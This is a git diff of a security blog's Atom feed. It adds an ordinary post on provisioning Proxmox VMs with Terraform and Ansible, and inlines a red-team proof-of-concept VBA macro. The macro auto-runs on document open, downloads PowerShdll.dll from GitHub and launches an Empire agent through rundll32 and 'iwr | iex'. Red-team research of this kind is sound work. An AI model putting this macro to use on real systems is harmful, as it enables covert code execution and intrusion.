@@ -1,4 +1,95 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://vanmieghem.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://vanmieghem.io/" rel="alternate" type="text/html" /><updated>2020-09-27T16:55:31+02:00</updated><id>https://vanmieghem.io/feed.xml</id><title type="html">Vincent Van Mieghem</title><subtitle>A blog about IT security</subtitle><entry><title type="html">Persisting our implant like the CIA</title><link href="https://vanmieghem.io/persisting-like-a-cia-agent/" rel="alternate" type="text/html" title="Persisting our implant like the CIA" /><published>2019-02-22T00:00:00+01:00</published><updated>2019-02-22T00:00:00+01:00</updated><id>https://vanmieghem.io/persisting-like-a-cia-agent</id><content type="html" xml:base="https://vanmieghem.io/persisting-like-a-cia-agent/">&lt;p&gt;In March 2017 Wikileaks published the CIA “Vault 7” leaks. Compared to the shadowbrokers NSA leak, this was not an impressive leak and was hardly retooled into red teaming tools. A while back a colleague of mine pointed me to &lt;a href=&quot;https://wikileaks.org/ciav7p1/cms/page_13763373.html&quot;&gt;this&lt;/a&gt; Vault7 page. Last weekend I found some time to get this technique to work.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://vanmieghem.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://vanmieghem.io/" rel="alternate" type="text/html" /><updated>2021-01-02T13:12:40+01:00</updated><id>https://vanmieghem.io/feed.xml</id><title type="html">Vincent Van Mieghem</title><subtitle>A blog about IT security</subtitle><entry><title type="html">Automating Proxmox with Terraform and Ansible</title><link href="https://vanmieghem.io/automating-proxmox-with-terraform-ansible/" rel="alternate" type="text/html" title="Automating Proxmox with Terraform and Ansible" /><published>2020-12-30T00:00:00+01:00</published><updated>2020-12-30T00:00:00+01:00</updated><id>https://vanmieghem.io/automating-proxmox-with-terraform-ansible</id><content type="html" xml:base="https://vanmieghem.io/automating-proxmox-with-terraform-ansible/">&lt;p&gt;During the hoidays I played around a bit with automating parts of my Proxmox homeserver setup. It consists of various LXC containers (CT) and Virtual Machines (VMs) for dedicated tasks and while I don’t regularly setup new containers and VMs, it’d be nice to have an quick and automated way of doing so.&lt;/p&gt;
+
+&lt;p&gt;For this automation I &lt;a href=&quot;https://github.com/vivami/proxmox-automation&quot;&gt;created&lt;/a&gt; a simple configuration that provisions a VM or CT using Terraform and Ansible. Telemate developed a &lt;a href=&quot;https://github.com/Telmate/terraform-provider-proxmox&quot;&gt;Terraform provider&lt;/a&gt; that maps Terraform functionality to the Proxmox API, so start by defining the use of that provider in &lt;code class=&quot;highlighter-rouge&quot;&gt;version.tf&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-hcl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;terraform&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;required_providers&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;proxmox&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Telmate/proxmox&quot;&lt;/span&gt;
+      &lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;2.6.6&quot;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;main.tf&lt;/code&gt; I’ve defined the variables for the Telemate Proxmox provider, for which the values of these are assigned in &lt;code class=&quot;highlighter-rouge&quot;&gt;var.tf&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-hcl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;provider&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;proxmox&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;pm_api_url&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;proxmox_host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;pm_api_url&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;pm_user&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;proxmox_host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;pm_user&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;pm_tls_insecure&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The next block in &lt;code class=&quot;highlighter-rouge&quot;&gt;main.tf&lt;/code&gt; defines a Proxmox QEMU VM &lt;code class=&quot;highlighter-rouge&quot;&gt;resource &quot;proxmox_vm_qemu&quot; {}&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;resource &quot;proxmox_lxc&quot; {}&lt;/code&gt;. Probably the most interesting part here it that my Terraform configuration supports the creation of multiple resources at once, by defining the hostnames and IP addresses respectively in &lt;code class=&quot;highlighter-rouge&quot;&gt;var.tf&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-hcl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;variable&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;hostnames&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;description&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Virtual machines to be created&quot;&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;        &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;default&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;prod-vm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;staging-vm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;dev-vm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;variable&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ips&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;description&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;IPs of the VMs, respective to the hostname order&quot;&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;        &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;default&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10.0.42.83&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;10.0.42.84&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;10.0.42.85&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In addition, I use Ansible as a provioner after the VM has been created. The host that kicks off the Terraform configuration will also run the Ansible playbook that in my default configuration will update the OS, create a sudo user, secure SSH and upload the SSH public keys you specify in &lt;code class=&quot;highlighter-rouge&quot;&gt;ansible/files/authorized_keys&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;I use the Terraform &lt;code class=&quot;highlighter-rouge&quot;&gt;connection&lt;/code&gt; block before provisioning to check whether the VM or container initialization is complete. Terraform will retry the connection and only continue executing the configuration when that connection is successful.&lt;/p&gt;
+
+&lt;div class=&quot;language-hcl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;c1&quot;&gt;# defines ssh connection to check when the VM is ready for ansible provisioning&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ips&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;private_key&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ssh_keys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;priv&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;agent&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;timeout&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;3m&quot;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
+
+  &lt;span class=&quot;nx&quot;&gt;provisioner&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;remote-exec&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;inline&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;echo 'Cool, we are ready for provisioning'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  
+  &lt;span class=&quot;nx&quot;&gt;provisioner&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;local-exec&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;working_dir&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;../../ansible/&quot;&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ansible-playbook -u ${var.user} --key-file ${var.ssh_keys[&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;priv&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;]} -i ${var.ips[count.index]}, provision.yaml&quot;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;cloud-init&quot;&gt;Cloud-init&lt;/h4&gt;
+&lt;p&gt;The configuration will use a VM template created by &lt;a href=&quot;https://pve.proxmox.com/wiki/Cloud-Init_Support&quot;&gt;cloud-init&lt;/a&gt;. There are various guides on how to configure one. Make sure the name of the templates matches &lt;code class=&quot;highlighter-rouge&quot;&gt;clone&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;main.tf&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;usage&quot;&gt;Usage&lt;/h3&gt;
+
+&lt;p&gt;The complete Terraform configuration and Ansible scripts I created are available on &lt;a href=&quot;https://github.com/vivami/proxmox-automation&quot;&gt;Github&lt;/a&gt;.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Install Terraform and Ansible on your machine
+    &lt;ul&gt;
+      &lt;li&gt;macOS: &lt;code class=&quot;highlighter-rouge&quot;&gt;brew install terraform ansible&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;Ubuntu: &lt;code class=&quot;highlighter-rouge&quot;&gt;apt install ansible&lt;/code&gt; and &lt;a href=&quot;https://learn.hashicorp.com/tutorials/terraform/install-cli&quot;&gt;install terraform&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git clone https://github.com/vivami/proxmox-automation.git&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Define your SSH keys in &lt;code class=&quot;highlighter-rouge&quot;&gt;proxmox-automation/ansible/files/authorized_keys&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Go to one of the directories &lt;code class=&quot;highlighter-rouge&quot;&gt;tf/ct/&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;tf/vm/&lt;/code&gt; and run &lt;code class=&quot;highlighter-rouge&quot;&gt;terraform init&lt;/code&gt;. This will initialize the Terraform configuration and pull in the Proxmox provider.
+&lt;img src=&quot;https://vanmieghem.io/assets/images/2020-12-30-automating-proxmox-with-terraform-ansible/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;Store your Proxmox password in the environment variable &lt;code class=&quot;highlighter-rouge&quot;&gt;$PM_PASS&lt;/code&gt;:
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;set +o history&lt;/code&gt; (disable history before storing secrets in variables)&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;export PM_PASS='your_proxmox_pass'&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Configure &lt;code class=&quot;highlighter-rouge&quot;&gt;var.tf&lt;/code&gt; (e.g. add your own private keys, hostnames/IPs) and &lt;code class=&quot;highlighter-rouge&quot;&gt;main.tf&lt;/code&gt; where necessary&lt;/li&gt;
+  &lt;li&gt;Run &lt;code class=&quot;highlighter-rouge&quot;&gt;terraform plan -out plan&lt;/code&gt; and if everything seems good &lt;code class=&quot;highlighter-rouge&quot;&gt;terraform apply&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;SSH into the box using &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh notroot@&amp;lt;configured_IP&amp;gt; -i ~/.ssh/private_key&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;To destory to infra created run &lt;code class=&quot;highlighter-rouge&quot;&gt;terraform destroy&lt;/code&gt;.
+&lt;img src=&quot;https://vanmieghem.io/assets/images/2020-12-30-automating-proxmox-with-terraform-ansible/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;</content><author><name>vivami</name></author><category term="blog" /><category term="Automation" /><summary type="html">During the hoidays I played around a bit with automating parts of my Proxmox homeserver setup. It consists of various LXC containers (CT) and Virtual Machines (VMs) for dedicated tasks and while I don’t regularly setup new containers and VMs, it’d be nice to have an quick and automated way of doing so.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://vanmieghem.io/assets/images/headers/proxmox-automation-header.jpg" /><media:content medium="image" url="https://vanmieghem.io/assets/images/headers/proxmox-automation-header.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Persisting our implant like the CIA</title><link href="https://vanmieghem.io/persisting-like-a-cia-agent/" rel="alternate" type="text/html" title="Persisting our implant like the CIA" /><published>2019-02-22T00:00:00+01:00</published><updated>2019-02-22T00:00:00+01:00</updated><id>https://vanmieghem.io/persisting-like-a-cia-agent</id><content type="html" xml:base="https://vanmieghem.io/persisting-like-a-cia-agent/">&lt;p&gt;In March 2017 Wikileaks published the CIA “Vault 7” leaks. Compared to the shadowbrokers NSA leak, this was not an impressive leak and was hardly retooled into red teaming tools. A while back a colleague of mine pointed me to &lt;a href=&quot;https://wikileaks.org/ciav7p1/cms/page_13763373.html&quot;&gt;this&lt;/a&gt; Vault7 page. Last weekend I found some time to get this technique to work.&lt;/p&gt;
 
 &lt;p&gt;I tend to only write about things that I haven’t found published somewhere else, so this blog post only lays out the operational details on getting this technique to work. Please read the Vault7 page first and if you’re interested, more research related to &lt;a href=&quot;https://www.gdatasoftware.com/blog/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence&quot;&gt;COM hijacking&lt;/a&gt; and on &lt;a href=&quot;https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/&quot;&gt;Abusing the COM Registry Structure&lt;/a&gt;.&lt;/p&gt;
 
@@ -204,7 +295,57 @@ static void compile(String source, String outfile) {
 
 &lt;p&gt;The VBA script below is a PoC I wrote that spawns an Empire agent in a RES One environment. It downloads the proper &lt;code&gt;PowerShdll.dll&lt;/code&gt; corresponding to the system’s architecture to the user’s &lt;code&gt;Temp&lt;/code&gt; directory and executes the script at &lt;code&gt;https://127.0.0.1/Empire_default_launcher.ps1&lt;/code&gt; (in this case the output of &lt;code&gt;launcher ListenerName&lt;/code&gt;.&lt;/p&gt;
 
-&lt;p&gt;true&lt;script src=&quot;https://gist.github.com/vivami/03780dd512fec22f3a2bae49f9023384.js&quot; class=&quot;bigger-image&quot;&gt; &lt;/script&gt;&lt;/p&gt;
+&lt;noscript&gt;&lt;pre&gt;Sub AutoOpen()
+    Debugging
+End Sub
+
+Sub Document_Open()
+    Debugging
+End Sub
+
+Public Function Debugging() As Variant
+    DownloadDLL
+    Dim Str As String
+    Str = &amp;quot;C:\Windows\System32\rundll32.exe &amp;quot; &amp;amp; Environ(&amp;quot;TEMP&amp;quot;) &amp;amp; &amp;quot;\powershdll.dll,main . { iwr -useb https://127.0.0.1/Empire_default_launcher.ps1 } ^| iex;&amp;quot;
+    strComputer = &amp;quot;.&amp;quot;
+    Set objWMIService = GetObject(&amp;quot;winmgmts:\\&amp;quot; &amp;amp; strComputer &amp;amp; &amp;quot;\root\cimv2&amp;quot;)
+    Set objStartup = objWMIService.Get(&amp;quot;Win32_ProcessStartup&amp;quot;)
+    Set objConfig = objStartup.SpawnInstance_
+    Set objProcess = GetObject(&amp;quot;winmgmts:\\&amp;quot; &amp;amp; strComputer &amp;amp; &amp;quot;\root\cimv2:Win32_Process&amp;quot;)
+    errReturn = objProcess.Create(Str, Null, objConfig, intProcessID)
+End Function
+
+
+Sub DownloadDLL()
+    Dim dll_Loc As String
+    dll_Loc = Environ(&amp;quot;TEMP&amp;quot;) &amp;amp; &amp;quot;\powershdll.dll&amp;quot;
+    If Not Dir(dll_Loc, vbDirectory) = vbNullString Then
+        Exit Sub
+    End If
+    
+    Dim dll_URL As String
+    #If Win64 Then
+        dll_URL = &amp;quot;https://github.com/p3nt4/PowerShdll/raw/master/dll/bin/x64/Release/PowerShdll.dll&amp;quot;
+    #Else
+        dll_URL = &amp;quot;https://github.com/p3nt4/PowerShdll/raw/master/dll/bin/x86/Release/PowerShdll.dll&amp;quot;
+    #End If
+    
+    Dim WinHttpReq As Object
+    Set WinHttpReq = CreateObject(&amp;quot;MSXML2.ServerXMLHTTP.6.0&amp;quot;)
+    WinHttpReq.Open &amp;quot;GET&amp;quot;, dll_URL, False
+    WinHttpReq.send
+
+    myURL = WinHttpReq.responseBody
+    If WinHttpReq.Status = 200 Then
+        Set oStream = CreateObject(&amp;quot;ADODB.Stream&amp;quot;)
+        oStream.Open
+        oStream.Type = 1
+        oStream.Write WinHttpReq.responseBody
+        oStream.SaveToFile dll_Loc
+        oStream.Close
+    End If
+End Sub&lt;/pre&gt;&lt;/noscript&gt;
+&lt;script src=&quot;https://gist.github.com/vivami/03780dd512fec22f3a2bae49f9023384.js&quot; class=&quot;bigger-image&quot;&gt; &lt;/script&gt;
 
 &lt;h3 id=&quot;running-an-awl-solution&quot;&gt;Running an AWL solution?&lt;/h3&gt;
 &lt;ul&gt;
